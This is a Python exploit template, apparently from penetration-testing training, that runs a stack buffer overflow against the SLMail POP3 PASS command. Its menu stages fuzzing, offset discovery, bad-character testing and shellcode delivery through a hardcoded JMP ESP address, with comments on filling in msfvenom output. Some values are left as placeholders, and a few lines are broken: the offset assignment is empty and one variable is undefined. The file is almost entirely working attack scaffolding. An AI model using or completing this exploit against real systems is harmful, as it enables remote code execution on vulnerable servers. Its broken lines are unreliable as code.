#! /usr/bin/env python

"""
# Author: Michael Zulian
# Last Update: 09/20/2019
# Purpose --
    Full Basic Buffer OverFlow
# Details --
    1) Take IP, paort
    2) Provide a menu to go through all the basic steps of Buffer Overflow - SCRIPT WILL NEED TO BE CHANGED REPEATLY
    3) Functions for each piece of the attack
        a) FUZZING - manual work required in determining where the program is vulnerable to a buffer overflow
        b) FUZZING with OFFSET - manual work required generating the pattern and the offset
        c) BADCHARS -
        d) SHELLCODE - manual work required in getting a JMP ESP instruction
# General TODO -
# Report Known Errors/Bugs -
    1)
"""

### Standard Library imports ###
import sys, socket
from time import sleep
import os

### VARIABLES ###
## target ##
ip = sys.argv[1]
port = sys.argv[2]

## buffer ##
# junk
junk = ['A']
counter = 100

## ITEMS THAT REQUIRING CHANGING ##

# Generating after finishing with fuzz() and generated with: pattern_create.rb -l ## CHANGE ME ##
offset_detection_pattern = ('')
# NOTE OFFSET HERE:
offset =
control_eip = "A" * offset

# NOTE JMP ESP ADDR HERE (DO CONFIRM BY SEARCHING IN THE DISASSEMBLER): 5F4A358F
# REMEMBER TO FLIP THE INSTRUCTION FOR LITTLE ENDIAN
jmp_esp_addr = "\x8f\x35\x4a\x5f"

# NOTE EXPLOIT HERE (TYPICALLY USE '-f c' in MSFVenom to get each line double quoted)
# NOTE MSFVENOM USED TO GENERATE HERE:
exploit = ()

# shellcode ## CHANGE NOP sled if required ##
nopSled = 0
shellcode = control_eip + jmp_esp_addr + "\x90" * nop + exploit

# badchars (removed \x00 - null (truncated payload),\x0a - line return, \x0d - carriage return)
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
        "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
        "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
        "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
        "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

### FUNCTIONS ###
def fuzzing(buffer,counter,ip,port):
    '''
    FUZZING: Find the segmentation fault, where can we write over the assigned buffer
        TODO ON PROGRAM:
            * Test all functions where user input is taken
            * Don't just overload with say 6000 characters, this causes the program to simply vanish
            * Hence the loop below, to go over various junk sizes, increasing by 200
    '''
    # Take a list (junk) and make an embedded list to cycle through
    while len(buffer) <= 30:
        buffer.append("A" * counter)
        counter += 200
        print(len(buffer))
        print(buffer)
    # Loop through each list sending a bunch of As in increments of 200
    for string in buffer:
        print "Fuzzing PASS with {0} bytes".format(len(string))
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connect=s.connect((ip, int(port)))

            ### SENDING PAYLOAD ### (CHANGES)
            # IN THIS CASE:  SLMAIL
            s.recv(1024)
            s.send('USER test\r\n')
            s.recv(1024)
            s.send('PASS ' + string + '\r\n')
            s.send('QUIT\r\n')
            s.close()
            sleep(1)

        except:
            print('Unable to connect to ' + ip + ' on' + port )
            break

def fuzzing_with_offset(buffer,ip,port):
    '''
    Purpose: We know the program has a segement fault somewhere within 200 characters, round up and run against pattern_create.rb - this is our new buffer
        NOTE:
            * Looping is no longer necessary as we know where to focus
    '''
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((ip, int(port)))

        ### SENDING PAYLOAD ### (CHANGES)
        # IN THIS CASE:  SLMAIL
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        s.send('QUIT\r\n')
        s.close()
        print('Payload delivered')

    except:
        print('Unable to connect to ' + ip + ' on' + port )

def test_badchars_offset(buffer,badchars,offset,ip,port):
    '''
    Purpose: We're almost ready to begin using JMP ESP and executing shellcode, first need to test all hex characters \
    some hex characters may be intrepreted as cmds by the program, this will be noted in the HEX Dump of the debugger
    NOTE:
        * When looking at badchars we should see a sequence of hex characters (this all possible ASCII characters)
        * We can also test our offset by sending 4 different ASCII characters (32 bytes)
    '''
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((ip, int(port)))

        ### SENDING PAYLOAD ### (CHANGES)
        # IN THIS CASE:  SLMAIL
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + buffer + 'B' * 4 + badchars + '\r\n')
        s.send('QUIT\r\n')
        s.close()
        os.system('clear')
        print('Payload delivered')
        sleep(3)
    except:
        print('Unable to connect to ' + ip + ' on' + port )

def send_shellcode(buffer,ip,port):
    '''
    Purpose: We know we control EIP and with how many bytes it takes to overload the buffer to get to EIP \
                We also know what characters are treated as actual instructions AKA badchars
        NOTE:
            * Now majority of the work needs to happen in the debugger
                * We need a JMP ESP instruction (FFE4) to get back into the programs overwritten buffer
                    * This is due to requiring a permanat address that will not change nor is memory protected
    '''
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((ip, int(port)))

        ### SENDING PAYLOAD ### (CHANGES)
        # IN THIS CASE:  SLMAIL
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        s.send('QUIT\r\n')
        s.close()
        os.system('clear')
        print('Payload delivered')
        sleep(3)
    except:
        print('Unable to connect to ' + ip + ' on' + port )


def main():
    ans=True
    while ans:
        os.system('clear')
        print ("""
        1.Fuzzing
        2.Fuzzing with offset
        3.badchars
        4.shellcode
        5.Exit/Quit
        """)
        ans=raw_input("What would you like to do? ")
        if ans=="1":
          fuzzing(junk,counter,ip,port)
          os.system('clear')
          print("If the output looks reasonable and the program crashed with EIP \n"
                " being overwritten, then take the number inbetween the last 2 fuzzing attempts \n"
                " and generate your pattern with pattern_create.rb; this may take more than one attempt")
          raw_input("Hit ENTER to continue")
          continue
        elif ans=="2":
          fuzzing_with_offset(offset_detection_pattern,ip,port)
          os.system('clear')
          print("The program should of crashed with EIP being populated with some random hex characters \n"
                ", can confirm control by sending the offset followed by a repeat of 4 characters")
          raw_input("Hit ENTER to continue")
        elif ans=="3":
          test_badchars_offset(control_eip,badchars,offset,ip,port)
          os.system('clear')
          print("We've now scrolled dilentigly through the hex dump of all bad characters. \n"
                "We've also noted that our offset is correct in the form of Bs covering the entire EIP register")
          raw_input("Hit ENTER to continue")
        elif ans=="4":
          send_shellcode(shellcode,ip,port)
          os.system('clear')
          print("We've hopefully successfully exploited at this point \n"
                "If not, check the listening port, on target check arch, test your JMP ESP addr using break points \n"
                "Confirm badchars again, double check exploit in the hex dump to confirm all original hex characters are there in both the stack and hexdump window")
          raw_input("Hit ENTER to continue")
        elif ans=="5":
          print("\n Goodbye")
          sys.quit()
        elif ans !="":
          print("\n Not Valid Choice Try again")


### MAIN ###
if __name__ == '__main__':

    main()
